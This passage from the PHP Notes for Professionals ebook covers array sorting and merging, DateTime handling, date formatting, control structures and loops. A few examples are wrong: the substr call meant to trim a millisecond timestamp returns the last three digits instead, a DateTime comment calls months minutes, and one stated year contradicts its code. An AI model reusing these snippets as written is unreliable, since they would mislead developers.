PHP
Notes for ProfessionalsPHP
Notes for Professionals
GoalKicker.com
Free Programming BooksDisclaimer
This is an unocial free book created for educational purposes and is
not aliated with ocial PHP group(s) or company(s).
All trademarks and registered trademarks are
the property of their respective owners
400+ pages
of professional hints and tricks

Contents
About  1  ................................................................................................................................................................................... 
print_r($fruits);
results in
Array
(
    [d] => lemon
    [c] => apple
    [b] => banana
    [a] => orange
)
natsort()
Sort an array in a way a human being would do (natural order).
$files = ['File8.stack' , 'file77.stack' , 'file7.stack' , 'file13.stack' , 'File2.stack' ];
natsort($files);
print_r($files);
results in
Array
(
    [4] => File2.stack
    [0] => File8.stack
    [2] => file7.stack
    [3] => file13.stack

GoalKicker.com – PHP Notes for Professionals 94    [1] => file77.stack
)
natcasesort()
Sort an array in a way a human being would do (natural order), but case intensive
$files = ['File8.stack' , 'file77.stack' , 'file7.stack' , 'file13.stack' , 'File2.stack' ];
natcasesort ($files);
print_r($files);
results in
Array
(
    [4] => File2.stack
    [2] => file7.stack
    [0] => File8.stack
    [3] => file13.stack
    [1] => file77.stack
)
shuﬄe()
Shuﬄes an array (sorted randomly).
$array = ['aa', 'bb', 'cc'];
shuffle($array);
print_r($array);
As written in the description it is random so here only one example in what it can result
Array
(
    [0] => cc
    [1] => bb
    [2] => aa
)
usort()
Sort an array with a user deﬁned comparison function.
function  compare ($a, $b)
{
    if ($a == $b) {
        return 0;
    }
    return ($a < $b) ? -1 : 1;
}
$array = [3, 2, 5, 6, 1];
usort($array, 'compare' );
print_r($array);
results in
Array
(
    [0] => 1

GoalKicker.com – PHP Notes for Professionals 95    [1] => 2
    [2] => 3
    [3] => 5
    [4] => 6
)
uasort()
Sort an array with a user deﬁned comparison function and preserve the keys.
function  compare ($a, $b)
{
    if ($a == $b) {
        return 0;
    }
    return ($a < $b) ? -1 : 1;
}
$array = ['a' => 1, 'b' => -3, 'c' => 5, 'd' => 3, 'e' => -5];
uasort($array, 'compare' );
print_r($array);
results in
Array
(
    [e] => -5
    [b] => -3
    [a] => 1
    [d] => 3
    [c] => 5
)
uksort()
Sort an array by keys with a user deﬁned comparison function.
function  compare ($a, $b)
{
    if ($a == $b) {
        return 0;
    }
    return ($a < $b) ? -1 : 1;
}
$array = ['ee' => 1, 'g' => -3, '4' => 5, 'k' => 3, 'oo' => -5];
uksort($array, 'compare' );
print_r($array);
results in
Array
(
    [ee] => 1
    [g] => -3
    [k] => 3
    [oo] => -5
    [4] => 5
)

GoalKicker.com – PHP Notes for Professionals 96Section 15.4: Whitelist only some array keys
When you want to allow only certain keys in your arrays, especially when the array comes from request parameters,
you can use array_intersect_key  together with array_flip .
$parameters  = ['foo' => 'bar', 'bar' => 'baz', 'boo' => 'bam'];
$allowedKeys  = ['foo', 'bar'];
$filteredParameters  = array_intersect_key ($parameters , array_flip ($allowedKeys ));
// $filteredParameters contains ['foo' => 'bar', 'bar' => 'baz]
If the parameters  variable doesn't contain any allowed key, then the filteredParameters  variable will consist of an
empty array.
Since PHP 5.6 you can use array_filter  for this task too, passing the ARRAY_FILTER_USE_KEY  ﬂag as the third
parameter:
$parameters   = ['foo' => 1, 'hello' => 'world'];
$allowedKeys  = ['foo', 'bar'];
$filteredParameters  = array_filter (
    $parameters ,
    function  ($key) use ($allowedKeys ) {
        return in_array ($key, $allowedKeys );
    },
    ARRAY_FILTER_USE_KEY
);
Using array_filter  gives the additional ﬂexibility of performing an arbitrary test against the key, e.g. $allowedKeys
could contain regex patterns instead of plain strings. It also more explicitly states the intention of the code than
array_intersect_key () combined with array_flip ().
Section 15.5: Adding element to start of array
Sometimes you want to add an element to the beginning of an array without modifying any of the current
elements ( order ) within the array . Whenever this is the case, you can use array_unshift ().
array_unshift () prepends passed elements to the front of the array. Note that the list of elements is
prepended as a whole, so that the prepended elements stay in the same order. All numerical array keys
will be modiﬁed to start counting from zero while literal keys won't be touched.
Taken from the PHP documentation  for array_unshift ().
If you'd like to achieve this, all you need to do is the following:
$myArray  = array(1, 2, 3);
array_unshift ($myArray , 4);
This will now add 4 as the ﬁrst element in your array. You can verify this by:
print_r($myArray );
This returns an array in the following order: 4, 1, 2, 3.

GoalKicker.com – PHP Notes for Professionals 97Since array_unshift  forces the array to reset the key-value pairs as the new element let the following entries have
the keys n+1 it is smarter to create a new array and append the existing array to the newly created array.
Example:
$myArray  = array('apples' , 'bananas' , 'pears');
$myElement  = array('oranges' );
$joinedArray  = $myElement ;
foreach ($myArray  as $i) {
  $joinedArray [] = $i;
}
Output ($joinedArray):
Array ( [0] => oranges [1] => apples [2] => bananas [3] => pears )
Eaxmple/Demo
Section 15.6: Exchange values with keys
array_flip  function will exchange all keys with its elements.
$colors = array(
    'one' => 'red',
    'two' => 'blue',
    'three' => 'yellow' ,
);
array_flip ($colors); //will output
array(
    'red' => 'one',
    'blue' => 'two',
    'yellow'  => 'three'
)
Section 15.7: Merge two arrays into one array
$a1 = array("red","green");
$a2 = array("blue","yellow" );
print_r(array_merge ($a1,$a2));
/*
    Array ( [0] => red [1] => green [2] => blue [3] => yellow )
*/
Associative array:
$a1=array("a"=>"red","b"=>"green");
$a2=array("c"=>"blue","b"=>"yellow" );
print_r(array_merge ($a1,$a2));
/*
    Array ( [a] => red [b] => yellow [c] => blue )
*/
Merges the elements of one or more arrays together so that the values of one are appended to the end of1.

GoalKicker.com – PHP Notes for Professionals 98the previous one. It returns the resulting array.
If the input arrays have the same string keys, then the later value for that key will overwrite the previous one.2.
If, however, the arrays contain numeric keys, the later value will not overwrite the original value, but will be
appended.
Values in the input array with numeric keys will be renumbered with incrementing keys starting from zero in3.
the result array.

GoalKicker.com – PHP Notes for Professionals 99Chapter 16: Processing Multiple Arrays
Together
Section 16.1: Array intersection
The array_intersect  function will return an array of values that exist in all arrays that were passed to this function.
$array_one  = ['one', 'two', 'three'];
$array_two  = ['two', 'three', 'four'];
$array_three  = ['two', 'three'];
$intersect  = array_intersect ($array_one , $array_two , $array_three );
// $intersect contains ['two', 'three']
Array keys are preserved. Indexes from the original arrays are not.
array_intersect  only check the values of the arrays. array_intersect_assoc  function will return intersection of
arrays with keys.
$array_one  = [1 => 'one',2 => 'two',3 => 'three'];
$array_two  = [1 => 'one', 2 => 'two', 3 => 'two', 4 => 'three'];
$array_three  = [1 => 'one', 2 => 'two'];
$intersect  = array_intersect_assoc ($array_one , $array_two , $array_three );
// $intersect contains [1 =>'one',2 => 'two']
array_intersect_key  function only check the intersection of keys. It will returns keys exist in all arrays.
$array_one  = [1 => 'one',2 => 'two',3 => 'three'];
$array_two  = [1 => 'one', 2 => 'two', 3 => 'four'];
$array_three  = [1 => 'one', 3 => 'five'];
$intersect  = array_intersect_key ($array_one , $array_two , $array_three );
// $intersect contains [1 =>'one',3 => 'three']
Section 16.2: Merge or concatenate arrays
$fruit1 = ['apples' , 'pears'];
$fruit2 = ['bananas' , 'oranges' ];
$all_of_fruits  = array_merge ($fruit1, $fruit2);
// now value of $all_of_fruits is [0 => 'apples', 1 => 'pears', 2 => 'bananas', 3 => 'oranges']
Note that array_merge  will change numeric indexes, but overwrite string indexes
$fruit1 = ['one' => 'apples' ,  'two' => 'pears'];
$fruit2 = ['one' => 'bananas' , 'two' => 'oranges' ];
$all_of_fruits  = array_merge ($fruit1, $fruit2);
// now value of $all_of_fruits is ['one' => 'bananas', 'two' => 'oranges']
array_merge  overwrites the values of the ﬁrst array with the values of the second array, if it cannot renumber the
index.
You can use the + operator to merge two arrays in a way that the values of the ﬁrst array never get overwritten, but

GoalKicker.com – PHP Notes for Professionals 100it does not renumber numeric indexes, so you lose values of arrays that have an index that is also used in the ﬁrst
array.
$fruit1 = ['one' => 'apples' ,  'two' => 'pears'];
$fruit2 = ['one' => 'bananas' , 'two' => 'oranges' ];
$all_of_fruits  = $fruit1 + $fruit2;
// now value of $all_of_fruits is ['one' => 'apples', 'two' => 'pears']
$fruit1 = ['apples' , 'pears'];
$fruit2 = ['bananas' , 'oranges' ];
$all_of_fruits  = $fruit1 + $fruit2;
// now value of $all_of_fruits is [0 => 'apples', 1 => 'pears']
Section 16.3: Changing a multidimensional array to associative
array
If you have a multidimensional array like this:
[
    ['foo',  'bar'],
    ['fizz', 'buzz'],
]
And you want to change it to an associative array like this:
[
    'foo'  => 'bar',
    'fizz' => 'buzz',
]
You can use this code:
$multidimensionalArray  = [
    ['foo',  'bar'],
    ['fizz', 'buzz'],
];
$associativeArrayKeys    = array_column ($multidimensionalArray , 0);
$associativeArrayValues  = array_column ($multidimensionalArray , 1);
$associativeArray        = array_combine ($associativeArrayKeys , $associativeArrayValues );
Or, you can skip setting $associativeArrayKeys  and $associativeArrayValues  and use this simple one liner:
$associativeArray  = array_combine (array_column ($multidimensionalArray , 0),
array_column ($multidimensionalArray , 1));
Section 16.4: Combining two arrays (keys from one, values
from another)
The following example shows how to merge two arrays into one associative array, where the key values will be the
items of the ﬁrst array, and the values will be from the second:
$array_one  = ['key1', 'key2', 'key3'];
$array_two  = ['value1' , 'value2' , 'value3' ];

GoalKicker.com – PHP Notes for Professionals 101$array_three  = array_combine ($array_one , $array_two );
var_export ($array_three );
/*
    array (
      'key1' => 'value1',
      'key2' => 'value2',
      'key3' => 'value3',
    )
*/

GoalKicker.com – PHP Notes for Professionals 102Chapter 17: Datetime Class
Section 17.1: Create Immutable version of DateTime from
Mutable prior PHP 5.6
To create \DateTimeImmutable  in PHP 5.6+ use:
\DateTimeImmutable ::createFromMutable ($concrete );
Prior PHP 5.6 you can use:
\DateTimeImmutable ::createFromFormat (\DateTime ::ISO8601, $mutable ->format(\DateTime ::ISO8601),
$mutable ->getTimezone ());
Section 17.2: Add or Subtract Date Intervals
We can use the class DateInterval  to add or subtract some interval in a DateTime object.
See the example below, where we are adding an interval of 7 days and printing a message on the screen:
$now = new DateTime ();// empty argument returns the current date
$interval  = new DateInterval ('P7D');//this objet represents a 7 days interval
$lastDay  = $now->add($interval ); //this will return a DateTime object
$formatedLastDay  = $lastDay ->format('Y-m-d');//this method format the DateTime object and returns a
String
echo "Samara says: Seven Days. You'll be happy on $formatedLastDay .";
This will output (running on Aug 1st, 2016):
Samara says: Seven Days. You'll be happy on 2016-08-08.
We can use the sub method in a similar way to subtract dates
$now->sub($interval );
echo "Samara says: Seven Days. You were happy last on $formatedLastDay .";
This will output (running on Aug 1st, 2016):
Samara says: Seven Days. You were happy last on 2016-07-25.
Section 17.3: getTimestamp
getTimeStemp  is a unix representation of a datetime object.
$date = new DateTime ();
echo $date->getTimestamp ();
this will out put an integer indication the seconds that have elapsed since 00:00:00 UTC, Thursday, 1 January 1970.

GoalKicker.com – PHP Notes for Professionals 103Section 17.4: setDate
setDate  sets the date in a DateTime object.
$date = new DateTime ();
$date->setDate(2016, 7, 25);
this example sets the date to be the twenty-ﬁfth of July, 2015, it will produce the following result:
2016-07-25 17:52:15.819442
Section 17.5: Create DateTime from custom format
PHP is able to parse a number of date formats . If you want to parse a non-standard format, or if you want your
code to explicitly state the format to be used, then you can use the static DateTime ::createFromFormat  method:
Object oriented style
$format = "Y,m,d";
$time = "2009,2,26" ;
$date = DateTime ::createFromFormat ($format, $time);
Procedural style
$format = "Y,m,d";
$time = "2009,2,26" ;
$date = date_create_from_format ($format, $time);
Section 17.6: Printing DateTimes
PHP 4+ supplies a method, format that converts a DateTime object into a string with a desired format. According to
PHP Manual, this is the object oriented function:
public string DateTime ::format ( string $format )
The function date() takes one parameters - a format, which is a string
Format
The format is a string, and uses single characters to deﬁne the format:
Y: four digit representation of the year (eg: 2016)
y: two digit representation of the year (eg: 16)
m: month, as a number (01 to 12)
M: month, as three letters (Jan, Feb, Mar, etc)
j: day of the month, with no leading zeroes (1 to 31)
D: day of the week, as three letters (Mon, Tue, Wed, etc)
h: hour (12-hour format) (01 to 12)
H: hour (24-hour format) (00 to 23)
A: either AM or PM
i: minute, with leading zeroes (00 to 59)
s: second, with leading zeroes (00 to 59)
The complete list can be found here

GoalKicker.com – PHP Notes for Professionals 104Usage
These characters can be used in various combinations to display times in virtually any format. Here are some
examples:
$date = new DateTime ('2000-05-26T13:30:20' ); /* Friday, May 26, 2000 at 1:30:20 PM */
$date->format("H:i");
/* Returns 13:30 */
$date->format("H i s");
/* Returns 13 30 20 */
$date->format("h:i:s A" );
/* Returns 01:30:20 PM */
$date->format("j/m/Y");
/* Returns 26/05/2000 */
$date->format("D, M j 'y - h:i A" );
/* Returns Fri, May 26 '00 - 01:30 PM */
Procedural
The procedural format is similar:
Object-Oriented
$date->format($format)
Procedural Equivalent
date_format ($date, $format)

GoalKicker.com – PHP Notes for Professionals 105Chapter 18: Working with Dates and Time
Section 18.1: Getting the dierence between two dates / times
The most feasible way is to use, the DateTime  class.
An example:
<?php
// Create a date time object, which has the value of ~ two years ago
$twoYearsAgo  = new DateTime ("2014-01-18 20:05:56" );
// Create a date time object, which has the value of ~ now
$now = new DateTime ("2016-07-21 02:55:07" );
// Calculate the diff
$diff = $now->diff($twoYearsAgo );
// $diff->y contains the difference in years between the two dates
$yearsDiff  = $diff->y;
// $diff->m contains the difference in minutes between the two dates
$monthsDiff  = $diff->m;
// $diff->d contains the difference in days between the two dates
$daysDiff  = $diff->d;
// $diff->h contains the difference in hours between the two dates
$hoursDiff  = $diff->h;
// $diff->i contains the difference in minutes between the two dates
$minsDiff  = $diff->i;
// $diff->s contains the difference in seconds between the two dates
$secondsDiff  = $diff->s;
// Total Days Diff, that is the number of days between the two dates
$totalDaysDiff  = $diff->days;
// Dump the diff altogether just to get some details ;)
var_dump ($diff);
Also, comparing two dates is much easier, just use the Comparison operators , like:
<?php
// Create a date time object, which has the value of ~ two years ago
$twoYearsAgo  = new DateTime ("2014-01-18 20:05:56" );
// Create a date time object, which has the value of ~ now
$now = new DateTime ("2016-07-21 02:55:07" );
var_dump ($now > $twoYearsAgo ); // prints bool(true)
var_dump ($twoYearsAgo  > $now); // prints bool(false)
var_dump ($twoYearsAgo  <= $twoYearsAgo ); // prints bool(true)
var_dump ($now == $now); // prints bool(true)
Section 18.2: Convert a date into another format
The Basics
The simplist way to convert one date format into another is to use strtotime () with date(). strtotime () will
convert the date into a Unix Timestamp . That Unix Timestamp can then be passed to date() to convert it to the
new format.
$timestamp  = strtotime ('2008-07-01T22:35:17.02' );

GoalKicker.com – PHP Notes for Professionals 106$new_date_format  = date('Y-m-d H:i:s' , $timestamp );
Or as a one-liner:
$new_date_format  = date('Y-m-d H:i:s' , strtotime ('2008-07-01T22:35:17.02' ));
Keep in mind that strtotime () requires the date to be in a valid format . Failure to provide a valid format will result
in strtotime () returning false which will cause your date to be 1969-12-31.
Using DateTime ()
As of PHP 5.2, PHP oﬀered the DateTime () class which oﬀers us more powerful tools for working with dates (and
time). We can rewrite the above code using DateTime () as so:
$date = new DateTime ('2008-07-01T22:35:17.02' );
$new_date_format  = $date->format('Y-m-d H:i:s' );
Working with Unix timestamps
date() takes a Unix timestamp as its second parameter and returns a formatted date for you:
$new_date_format  = date('Y-m-d H:i:s' , '1234567890' );
DateTime() works with Unix timestamps by adding an @ before the timestamp:
$date = new DateTime ('@1234567890' );
$new_date_format  = $date->format('Y-m-d H:i:s' );
If the timestamp you have is in milliseconds (it may end in 000 and/or the timestamp is thirteen characters long)
you will need to convert it to seconds before you can can convert it to another format. There's two ways to do this:
Trim the last three digits oﬀ using substr()
Trimming the last three digits can be achieved several ways, but using substr() is the easiest:
$timestamp  = substr('1234567899000' , -3);
Divide the substr by 1000
You can also convert the timestamp into seconds by dividing by 1000. Because the timestamp is too large for 32 bit
systems to do math on you will need to use the BCMath  library to do the math as strings:
$timestamp  = bcdiv('1234567899000' , '1000');
To get a Unix Timestamp you can use strtotime () which returns a Unix Timestamp:
$timestamp  = strtotime ('1973-04-18' );
With DateTime() you can use DateTime ::getTimestamp ()
$date = new DateTime ('2008-07-01T22:35:17.02' );
$timestamp  = $date->getTimestamp ();
If you're running PHP 5.2 you can use the U formatting option instead:

GoalKicker.com – PHP Notes for Professionals 107$date = new DateTime ('2008-07-01T22:35:17.02' );
$timestamp  = $date->format('U');
Working with non-standard and ambiguous date formats
Unfortunately not all dates that a developer has to work with are in a standard format. Fortunately PHP 5.3
provided us with a solution for that. DateTime ::createFromFormat () allows us to tell PHP what format a date string
is in so it can be successfully parsed into a DateTime object for further manipulation.
$date = DateTime ::createFromFormat ('F-d-Y h:i A' , 'April-18-1973 9:48 AM' );
$new_date_format  = $date->format('Y-m-d H:i:s' );
In PHP 5.4 we gained the ability to do class member access on instantiation has been added which allows us to turn
our DateTime () code into a one-liner:
$new_date_format  = (new DateTime ('2008-07-01T22:35:17.02' ))->format('Y-m-d H:i:s' );
Unfortunately this does not work with DateTime ::createFromFormat () yet.
Section 18.3: Parse English date descriptions into a Date
format
Using the strtotime () function combined with date() you can parse diﬀerent English text descriptions to dates:
// Gets the current date
echo date("m/d/Y", strtotime ("now")), "\n"; // prints the current date
echo date("m/d/Y", strtotime ("10 September 2000" )), "\n"; // prints September 10, 2000 in the m/d/Y
format
echo date("m/d/Y", strtotime ("-1 day" )), "\n"; // prints yesterday's date
echo date("m/d/Y", strtotime ("+1 week" )), "\n"; // prints the result of the current date + a week
echo date("m/d/Y", strtotime ("+1 week 2 days 4 hours 2 seconds" )), "\n"; // same as the last
example but with extra days, hours, and seconds added to it
echo date("m/d/Y", strtotime ("next Thursday" )), "\n"; // prints next Thursday's date
echo date("m/d/Y", strtotime ("last Monday" )), "\n"; // prints last Monday's date
echo date("m/d/Y", strtotime ("First day of next month" )), "\n"; // prints date of first day of next
month
echo date("m/d/Y", strtotime ("Last day of next month" )), "\n"; // prints date of last day of next
month
echo date("m/d/Y", strtotime ("First day of last month" )), "\n"; // prints date of first day of last
month
echo date("m/d/Y", strtotime ("Last day of last month" )), "\n"; // prints date of last day of last
month
Section 18.4: Using Predeﬁned Constants for Date Format
We can use Predeﬁned Constants for Date format in date() instead of the conventional date format strings since
PHP 5.1.0.
Predeﬁned Date Format Constants Available
DATE_ATOM  - Atom (2016-07-22T14:50:01+00:00)
DATE_COOKIE  - HTTP Cookies (Friday, 22-Jul-16 14:50:01 UTC)
DATE_RSS  - RSS (Fri, 22 Jul 2016 14:50:01 +0000)

GoalKicker.com – PHP Notes for Professionals 108DATE_W3C  - World Wide Web Consortium (2016-07-22T14:50:01+00:00)
DATE_ISO8601  - ISO-8601 (2016-07-22T14:50:01+0000)
DATE_RFC822  - RFC 822 (Fri, 22 Jul 16 14:50:01 +0000)
DATE_RFC850  - RFC 850 (Friday, 22-Jul-16 14:50:01 UTC)
DATE_RFC1036  - RFC 1036 (Fri, 22 Jul 16 14:50:01 +0000)
DATE_RFC1123  - RFC 1123 (Fri, 22 Jul 2016 14:50:01 +0000)
DATE_RFC2822  - RFC 2822 (Fri, 22 Jul 2016 14:50:01 +0000)
DATE_RFC3339  - Same as DATE_ATOM (2016-07-22T14:50:01+00:00)
Usage Examples
echo date(DATE_RFC822 );
This will output: Fri, 22 Jul 16 14:50:01 +0000
echo date(DATE_ATOM ,mktime(0,0,0,8,15,1947));
This will output: 1947-08-15T00:00:00+05:30

GoalKicker.com – PHP Notes for Professionals 109Chapter 19: Control Structures
Section 19.1: if else
The if statement in the example above allows to execute a code fragment, when the condition is met. When you
want to execute a code fragment, when the condition is not met you extend the if with an else .
if ($a > $b) {
  echo "a is greater than b" ;
} else {
  echo "a is NOT greater than b" ;
}
PHP Manual - Control Structures - Else
The ternary operator as shorthand syntax for if-else
The ternary operator  evaluates something based on a condition being true or not. It is a comparison operator and
often used to express a simple if-else condition in a shorter form. It allows to quickly test a condition and often
replaces a multi-line if statement, making your code more compact.
This is the example from above using a ternary expression and variable values: $a=1; $b=2;
echo ($a > $b) ? "a is greater than b"  : "a is NOT greater than b" ;
Outputs: a is NOT greater than b .
Section 19.2: Alternative syntax for control structures
PHP provides an alternative syntax for some control structures: if, while , for, foreach , and switch .
When compared to the normal syntax, the diﬀerence is, that the opening brace is replaced by a colon ( :) and the
closing brace is replaced by endif;, endwhile ;, endfor;, endforeach ;, or endswitch ;, respectively. For individual
examples, see the topic on alternative syntax for control structures.
if ($a == 42):
    echo "The answer to life, the universe and everything is 42." ;
endif;
Multiple elseif  statements using short-syntax:
if ($a == 5):
    echo "a equals 5" ;
elseif ($a == 6):
    echo "a equals 6" ;
else:
    echo "a is neither 5 nor 6" ;
endif;
PHP Manual - Control Structures - Alternative Syntax
Section 19.3: while
while  loop iterates through a block of code as long as a speciﬁed condition is true.

GoalKicker.com – PHP Notes for Professionals 110$i = 1;
while ($i < 10) {
    echo $i;
    $i++;
}
Output:
123456789
For detailed information, see the Loops topic.
Section 19.4: do-while
do-while  loop ﬁrst executes a block of code once, in every case, then iterates through that block of code as long as
a speciﬁed condition is true.
$i = 0;
do {
    $i++;
    echo $i;
} while ($i < 10);
Output: `12345678910 `
For detailed information, see the Loops topic.
Section 19.5: goto
The goto  operator allows to jump to another section in the program. It's available since PHP 5.3.
The goto instruction is a goto followed by the desired target label: goto MyLabel ;.
The target of the jump is speciﬁed by a label followed by a colon: MyLabel:.
This example will print Hello World !:
<?php
goto MyLabel ;
echo 'This text will be skipped, because of the jump.' ;
 
MyLabel:
echo 'Hello World!' ;
?>
Section 19.6: declare
declare  is used to set an execution directive for a block of code.
The following directives are recognized:
ticks
encoding
strict_types
For instance, set ticks to 1:

GoalKicker.com – PHP Notes for Professionals 111declare(ticks=1);
To enable strict type mode, the declare  statement is used with the strict_types  declaration:
declare(strict_types =1);
Section 19.7: include & require
require
require  is similar to include , except that it will produce a fatal E_COMPILE_ERROR  level error on failure. When the
require  fails, it will halt the script. When the include  fails, it will not halt the script and only emit E_WARNING .
require 'file.php' ;
PHP Manual - Control Structures - Require
include
The include  statement includes and evaluates a ﬁle.
./variables.php
$a = 'Hello World!' ;
./main.php`
include 'variables.php' ;
echo $a;
// Output: `Hello World!`
Be careful with this approach, since it is considered a code smell , because the included ﬁle is altering amount and
content of the deﬁned variables in the given scope.
You can also include  ﬁle, which returns a value. This is extremely useful for handling conﬁguration arrays:
conﬁguration.php
<?php
return [
    'dbname'  => 'my db',
    'user' => 'admin',
    'pass' => 'password' ,
];
main.php
<?php

GoalKicker.com – PHP Notes for Professionals 112$config = include 'configuration.php' ;
This approach will prevent the included ﬁle from polluting your current scope with changed or added variables.
PHP Manual - Control Structures - Include
include & require  can also be used to assign values to a variable when returned something by ﬁle.
Example :
include1.php ﬁle :
<?php
    $a = "This is to be returned" ;
    return $a;
?>
index.php ﬁle :
    $value = include 'include1.php' ;
   // Here, $value = "This is to be returned"
Section 19.8: return
The return  statement returns the program control to the calling function.
When return  is called from within a function, the execution of the current function will end.
function  returnEndsFunctions ()
{
   echo 'This is executed' ;
   return;
   echo 'This is not executed.' ;
}
When you run returnEndsFunctions (); you'll get the output This is executed ;
When return  is called from within a function with and argument, the execution of the current function will end and
the value of the argument will be returned to the calling function.
Section 19.9: for
for loops are typically used when you have a piece of code which you want to repeat a given number of times.
for ($i = 1; $i < 10; $i++) {
    echo $i;
}
Outputs:
123456789
For detailed information, see the Loops topic.

GoalKicker.com – PHP Notes for Professionals 113Section 19.10: foreach
foreach  is a construct, which enables you to iterate over arrays and objects easily.
$array = [1, 2, 3];
foreach ($array as $value) {
    echo $value;
}
Outputs:
123
.
To use foreach  loop with an object, it has to implement Iterator  interface.
When you iterate over associative arrays:
$array = ['color'=>'red'];
foreach($array as $key => $value){
    echo $key . ': ' . $value;
}
Outputs:
color: red
For detailed information, see the Loops topic.
Section 19.11: if elseif else
elseif
elseif  combines if and else . The if statement is extended to execute a diﬀerent statement in case the original if
expression is not met. But, the alternative expression is only executed, when the elseif  conditional expression is
met.
The following code displays either "a is bigger than b", "a is equal to b" or "a is smaller than b":
if ($a > $b) {
    echo "a is bigger than b" ;
} elseif ($a == $b) {
    echo "a is equal to b" ;
} else {
    echo "a is smaller than b" ;
}
Several elseif statements
You can use multiple elseif statements within the same if statement:
if ($a == 1) {
    echo "a is One" ;
} elseif ($a == 2) {
    echo "a is Two" ;

GoalKicker.com – PHP Notes for Professionals 114} elseif ($a == 3) {
    echo "a is Three" ;
} else {
    echo "a is not One, not Two nor Three" ;
}
Section 19.12: if
The if construct allows for conditional execution of code fragments.
if ($a > $b) {
  echo "a is bigger than b" ;
}
PHP Manual - Control Structures - If
Section 19.13: switch
The switch  structure performs the same function as a series of if statements, but can do the job in fewer lines of
code. The value to be tested, as deﬁned in the switch  statement, is compared for equality with the values in each of
the case  statements until a match is found and the code in that block is executed. If no matching case  statement is
found, the code in the default  block is executed, if it exists.
Each block of code in a case  or default  statement should end with the break  statement. This stops the execution
of the switch  structure and continues code execution immediately afterwards. If the break  statement is omitted,
the next case  statement's code is executed, even if there is no match . This can cause unexpected code execution if
the break  statement is forgotten, but can also be useful where multiple case  statements need to share the same
code.
switch ($colour) {
case "red":
    echo "the colour is red" ;
    break;
case "green":
case "blue":
    echo "the colour is green or blue" ;
    break;
case "yellow" :
    echo "the colour is yellow" ;
    // note missing break, the next block will also be executed
case "black":
    echo "the colour is black" ;
    break;
default:
    echo "the colour is something else" ;
    break;
}
In addition to testing ﬁxed values, the construct can also be coerced to test dynamic statements by providing a
boolean value to the switch  statement and any expression to the case  statement. Keep in mind the ﬁrst matching
value is used, so the following code will output "more than 100":
$i = 1048;
switch (true) {
case ($i > 0):
    echo "more than 0" ;
    break;

GoalKicker.com – PHP Notes for Professionals 115case ($i > 100):
    echo "more than 100" ;
    break;
case ($i > 1000):
    echo "more than 1000" ;
    break;
}
For possible issues with loose typing while using the switch  construct, see Switch Surprises

GoalKicker.com – PHP Notes for Professionals 116Chapter 20: Loops
Loops are a fundamental aspect of programming. They allow programmers to create code that repeats for some
given number of repetitions, or iterations . The number of iterations can be explicit (6 iterations, for example), or
continue until some condition is met ('until Hell freezes over').
This topic covers the diﬀerent types of loops, their associated control statements, and their potential applications in
PHP.
Section 20.1: continue
The continue  keyword halts the current iteration of a loop but does not terminate the loop.
Just like the break  statement the continue  statement is situated inside the loop body. When executed, the
continue  statement causes execution to immediately jump to the loop conditional.
In the following example loop prints out a message based on the values in an array, but skips a speciﬁed value.
$list = ['apple', 'banana' , 'cherry' ];
foreach ($list as $value) {
    if ($value == 'banana' ) {
        continue ;
    }
    echo "I love to eat {$value}  pie.".PHP_EOL;
}
The expected output is:
I love to eat apple pie .
I love to eat cherry pie .
The continue  statement may also be used to immediately continue execution to an outer level of a loop by
specifying the number of loop levels to jump. For example, consider data such as
Fruit Color Cost
Apple Red 1
Banana Yellow 7
Cherry Red 2
Grape Green 4
In order to only make pies from fruit which cost less than 5
$data = [
    [ "Fruit" => "Apple",  "Color" => "Red",    "Cost" => 1 ],
    [ "Fruit" => "Banana" , "Color" => "Yellow" , "Cost" => 7 ],
    [ "Fruit" => "Cherry" , "Color" => "Red",    "Cost" => 2 ],
    [ "Fruit" => "Grape",  "Color" => "Green",  "Cost" => 4 ]
];
foreach($data as $fruit) {
    foreach($fruit as $key => $value) {
        if ($key == "Cost" && $value >= 5) {

GoalKicker.com – PHP Notes for Professionals 117            continue  2;
        }
        /* make a pie */
    }
}
When the continue  2 statement is executed, execution immediately jumps back to $data as $fruit  continuing
the outer loop and skipping all other code (including the conditional in the inner loop.
Section 20.2: break
The break  keyword immediately terminates the current loop.
Similar to the continue  statement, a break  halts execution of a loop. Unlike a continue  statement, however, break
causes the immediate termination of the loop and does not execute the conditional statement again.
$i = 5;
while(true) {
    echo 120/$i.PHP_EOL;
    $i -= 1;
    if ($i == 0) {
        break;
    }
}
This code will produce
24
30
40
60
120
but will not execute the case where $i is 0, which would result in a fatal error due to division by 0.
The break statement may also be used to break out of several levels of loops. Such behavior is very useful when
executing nested loops. For example, to copy an array of strings into an output string, removing any # symbols,
